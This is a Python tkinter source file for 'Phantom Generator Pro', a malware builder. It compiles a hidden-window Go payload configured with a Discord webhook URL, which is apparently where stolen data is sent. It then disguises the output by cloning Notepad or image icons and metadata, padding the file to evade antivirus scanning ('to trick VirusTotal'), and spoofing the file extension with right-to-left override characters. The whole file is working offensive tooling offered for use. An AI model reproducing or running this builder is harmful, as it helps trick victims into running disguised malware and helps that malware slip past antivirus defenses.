import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import os
import subprocess
import sys
from resource_injector import inject_icon, clone_resources

class Phantom:
    def __init__(self, root):
        self.root = root
        self.root.title("Phantom Generator Pro")
        self.root.geometry("600x650")
        self.root.configure(bg="#1a1a1a")
        self.root.resizable(True, True)
        
        # Style
        style = ttk.Style()
        style.theme_use('clam')
        
        # Colors
        BG_COLOR = "#1a1a1a"
        ACCENT_COLOR = "#3498db"
        TEXT_COLOR = "#ecf0f1"
        SECONDARY_BG = "#2c3e50"

        style.configure("TFrame", background=BG_COLOR)
        style.configure("TLabel", background=BG_COLOR, foreground=TEXT_COLOR, font=("Segoe UI", 10))
        style.configure("TButton", font=("Segoe UI", 10, "bold"))
        style.configure("Header.TLabel", font=("Segoe UI", 20, "bold"), foreground=ACCENT_COLOR)
        style.configure("Status.TLabel", font=("Segoe UI", 9, "italic"), foreground="#95a5a6")
        style.configure("Horizontal.TProgressbar", thickness=10)

        # Initialize attributes
        self.destination = None
        self.icon_path = None
        self.go_executable = self._find_go_executable()

        # Main Container
        main_frame = ttk.Frame(root, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Header
        header = ttk.Label(main_frame, text="PHANTOM GENERATOR", style="Header.TLabel")
        header.pack(pady=(0, 15))

        # Webhook URL
        ttk.Label(main_frame, text="Discord Webhook URL:").pack(anchor=tk.W)
        self.url_entry = ttk.Entry(main_frame, width=60)
        self.url_entry.pack(fill=tk.X, pady=(5, 10))

        # EXE Name
        ttk.Label(main_frame, text="Output EXE Name:").pack(anchor=tk.W)
        self.exe_entry = ttk.Entry(main_frame, width=60)
        self.exe_entry.insert(0, "phantom_payload.exe")
        self.exe_entry.pack(fill=tk.X, pady=(5, 10))

        # Camouflage Options Frame
        camo_frame = ttk.LabelFrame(main_frame, text="🛡️ Camouflage & Stealth", padding=10)
        camo_frame.pack(fill=tk.X, pady=(0, 10))

        self.camo_var = tk.StringVar(value="None")
        ttk.Radiobutton(camo_frame, text="Normal EXE", variable=self.camo_var, value="None").grid(row=0, column=0, sticky=tk.W, padx=5)
        ttk.Radiobutton(camo_frame, text="Notepad (.txt)", variable=self.camo_var, value="Notepad").grid(row=0, column=1, sticky=tk.W, padx=5)
        ttk.Radiobutton(camo_frame, text="Image (.png)", variable=self.camo_var, value="Image").grid(row=0, column=2, sticky=tk.W, padx=5)

        self.rtlo_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(camo_frame, text="Use RTLO (Extension Spoof)", variable=self.rtlo_var).grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)

        self.fud_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(camo_frame, text="FUD Optimization (Padding + Anti-AV)", variable=self.fud_var).grid(row=1, column=1, columnspan=2, sticky=tk.W, padx=5, pady=5)

        # Buttons Frame
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill=tk.X, pady=10)

        self.destination_button = ttk.Button(btn_frame, text="📁 Select Folder", command=self.select_destination)
        self.destination_button.pack(side=tk.LEFT, padx=(0, 10), expand=True, fill=tk.X)

        self.icon_button = ttk.Button(btn_frame, text="🖼️ Select Icon", command=self.select_icon)
        self.icon_button.pack(side=tk.LEFT, expand=True, fill=tk.X)

        # Status Labels
        info_frame = ttk.Frame(main_frame)
        info_frame.pack(fill=tk.X, pady=10)

        self.dest_label = ttk.Label(info_frame, text="📍 No folder selected", font=("Segoe UI", 8), foreground="#bdc3c7")
        self.dest_label.pack(anchor=tk.W)
        
        self.icon_label = ttk.Label(info_frame, text="🖼️ No icon selected", font=("Segoe UI", 8), foreground="#bdc3c7")
        self.icon_label.pack(anchor=tk.W)

        # Generate Button
        self.generate_button = ttk.Button(main_frame, text="⚡ GENERATE PAYLOAD", command=self.generate_malware)
        self.generate_button.pack(fill=tk.X, pady=(20, 10))

        # Progress
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(main_frame, variable=self.progress_var, maximum=100, style="Horizontal.TProgressbar")
        self.progress_bar.pack(fill=tk.X, pady=(10, 5))
        
        self.status_label = ttk.Label(main_frame, text="Ready", style="Status.TLabel")
        self.status_label.pack()
    
    def _find_go_executable(self):
        """Find the Go executable in the system"""
        # 1. Try common locations
        possible_paths = [
            os.path.join(os.environ.get("ProgramFiles", "C:\\Program Files"), "Go", "bin", "go.exe"),
            "C:\\go\\bin\\go.exe",
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                return path
        
        # 2. Try from PATH using 'where' or 'which'
        try:
            cmd = "where" if os.name == "nt" else "which"
            result = subprocess.run([cmd, "go"], capture_output=True, text=True, check=True)
            return result.stdout.strip().split('\n')[0]
        except:
            return None

    def select_destination(self):
        self.destination = filedialog.askdirectory()
        if self.destination:
            self.dest_label.config(text=f"📍 {os.path.abspath(self.destination)}")

    def select_icon(self):
        self.icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if self.icon_path:
            self.icon_label.config(text=f"🖼️ {os.path.basename(self.icon_path)}")

    def generate_malware(self):
        url = self.url_entry.get().strip()
        exe_name = self.exe_entry.get().strip()
        
        if not url:
            messagebox.showwarning("Warning", "Please enter a Webhook URL")
            return
        if not self.destination:
            messagebox.showwarning("Warning", "Please select a destination folder")
            return
        
        if not self.go_executable:
            messagebox.showerror("Error", "Go (Golang) not found on your system.\nPlease install it from https://go.dev/")
            return
        
        if not exe_name.endswith('.exe'):
            exe_name += '.exe'
        
        try:
            self.generate_button.config(state=tk.DISABLED)
            self.status_label.config(text="Initializing...")
            self.progress_var.set(5)
            self.root.update()
            
            script_dir = os.path.dirname(os.path.abspath(__file__))
            go_payload_dir = os.path.join(script_dir, "go_payload")
            output_exe = os.path.join(self.destination, exe_name)
            
            if not os.path.exists(os.path.join(go_payload_dir, "main.go")):
                messagebox.showerror("Error", "Source files missing in 'go_payload' directory")
                return
            
            self.status_label.config(text="Preparing build environment...")
            self.progress_var.set(20)
            self.root.update()
            
            # Compile Go code
            timestamp = str(__import__('datetime').datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            # ldflags: -s -w (reduce size), -H=windowsgui (no console window)
            ldflags = f"-s -w -H=windowsgui -X main.WebhookURL={url} -X \"main.Timestamp={timestamp}\""
            
            self.status_label.config(text="Compiling binary (Go)...")
            self.progress_var.set(40)
            self.root.update()

            build_cmd = [
                self.go_executable, "build",
                "-o", output_exe,
                "-ldflags", ldflags,
                "main.go"
            ]
            
            result = subprocess.run(build_cmd, check=True, cwd=go_payload_dir, 
                                 capture_output=True, text=True)
            
            # Inject icon & Metadata
            target_file_for_meta = None
            camo_mode = self.camo_var.get()
            
            if camo_mode == "Notepad":
                target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "notepad.exe")
            elif camo_mode == "Image":
                target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "imageres.dll")

            if target_file_for_meta:
                self.status_label.config(text="Cloning metadata & icon...")
                self.progress_var.set(70)
                self.root.update()
                try:
                    # Use clone_resources to copy everything (Icon, Version, Manifest)
                    if not clone_resources(target_file_for_meta, output_exe):
                        # Fallback to just icon if cloning fails
                        inject_icon(output_exe, target_file_for_meta)
                except Exception as e:
                    print(f"Warning: Metadata/Icon cloning failed: {e}")
            
            # FUD Optimization (Padding)
            if self.fud_var.get():
                self.status_label.config(text="Applying FUD optimizations...")
                self.progress_var.set(80)
                self.root.update()
                try:
                    # To trick VirusTotal: we append a real legitimate file at the end
                    # or large random data. Legit file is better for entropy.
                    if camo_mode == "Notepad" and os.path.exists(target_file_for_meta):
                        with open(target_file_for_meta, "rb") as f_legit:
                            legit_data = f_legit.read()
                        with open(output_exe, "ab") as f_out:
                            f_out.write(legit_data) # Bind real notepad at the end
                    
                    with open(output_exe, "ab") as f:
                        f.write(os.urandom(25 * 1024 * 1024)) # Add 25MB padding
                except:
                    pass

            # UPX Compression
            if not self.fud_var.get(): # Don't use UPX if FUD is enabled (UPX is often flagged)
                self.status_label.config(text="Applying UPX compression...")
                self.progress_var.set(85)
                self.root.update()
                try:
                    subprocess.run(["upx", "--best", output_exe], check=False, capture_output=True)
                except:
                    pass
            
            # RTLO Extension Spoofing
            final_path = output_exe
            if self.rtlo_var.get():
                self.status_label.config(text="Applying RTLO spoofing...")
                dir_name = os.path.dirname(output_exe)
                base_name = os.path.basename(output_exe).replace(".exe", "")
                
                if camo_mode == "Notepad":
                    # name [RTLO] exe.txt -> looks like name txt.exe
                    spoofed_name = f"{base_name}\u202etxt.exe"
                elif camo_mode == "Image":
                    # name [RTLO] exe.png -> looks like name png.exe
                    spoofed_name = f"{base_name}\u202epng.exe"
                else:
                    spoofed_name = f"{base_name}\u202egpj.exe" # default to .jpg look
                
                final_path = os.path.join(dir_name, spoofed_name)
                try:
                    if os.path.exists(final_path):
                        os.remove(final_path)
                    os.rename(output_exe, final_path)
                except Exception as e:
                    print(f"RTLO Rename failed: {e}")

            self.status_label.config(text="Payload ready!")
            self.progress_var.set(100)
            self.root.update()
            
            messagebox.showinfo("Success", f"Payload generated successfully!\n\nLocation: {final_path}")
            
        except subprocess.CalledProcessError as e:
            error_msg = e.stderr if e.stderr else str(e)
            messagebox.showerror("Build Error", f"Compilation failed:\n{error_msg}")
        except Exception as e:
            messagebox.showerror("Error", f"An unexpected error occurred:\n{str(e)}")
        finally:
            self.generate_button.config(state=tk.NORMAL)
            self.status_label.config(text="Ready")
            self.progress_var.set(0)

if __name__ == "__main__":
    root = tk.Tk()
    app = Phantom(root)
    root.mainloop()
